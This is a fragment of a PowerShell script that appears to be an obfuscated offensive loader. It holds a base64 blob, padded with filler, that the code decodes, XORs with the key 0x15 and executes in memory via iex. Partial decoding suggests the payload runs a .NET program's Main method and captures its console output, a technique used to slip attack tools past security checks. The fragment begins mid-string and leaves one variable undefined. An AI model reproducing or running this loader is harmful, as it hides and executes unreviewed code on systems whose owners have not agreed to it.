VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFQoNxgfNTU1NTFHVEY1KDVORmxmYXB4O0dw
c3lwdmF8ens7VGZmcHh3eWxILy9ZenRxPU5WentjcGdhSC8vU2d6eFd0ZnAjIUZhZ3x7cj0xd3Rm
cCMhd3x7dGdsPDwYHxgfNTU1NTFaeXFWentmenlwWmBhNSg1TlZ6e2Z6eXBILy9aYGEYHzU1NTUx
RmFnfHtyQmd8YXBnNSg1W3BiOFp3f3B2YTVcWjtGYWd8e3JCZ3xhcGcYHzU1NTVOVnp7Znp5cEgv
L0ZwYVpgYT0xRmFnfHtyQmd8YXBnPBgfGB81NTU1TkZ9dGdlRnt8ZXBnO0VnenJndHhILy9YdHx7
PTFWenh4dHtxO0ZleXxhPTc1Nzw8GB8YHzU1NTVOVnp7Znp5cEgvL0ZwYVpgYT0xWnlxVnp7Znp5
cFpgYTwYHzU1NTUxR3BmYHlhZjUoNTFGYWd8e3JCZ3xhcGc7QXpGYWd8e3I9PBgfNTU1NTFHcGZg
eWFmGB9oGB8="

$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
$data = $enc.GetBytes($file)|%{$_-bXor0x15}
iex ([System.Text.Encoding]::ASCII.GetString($data))

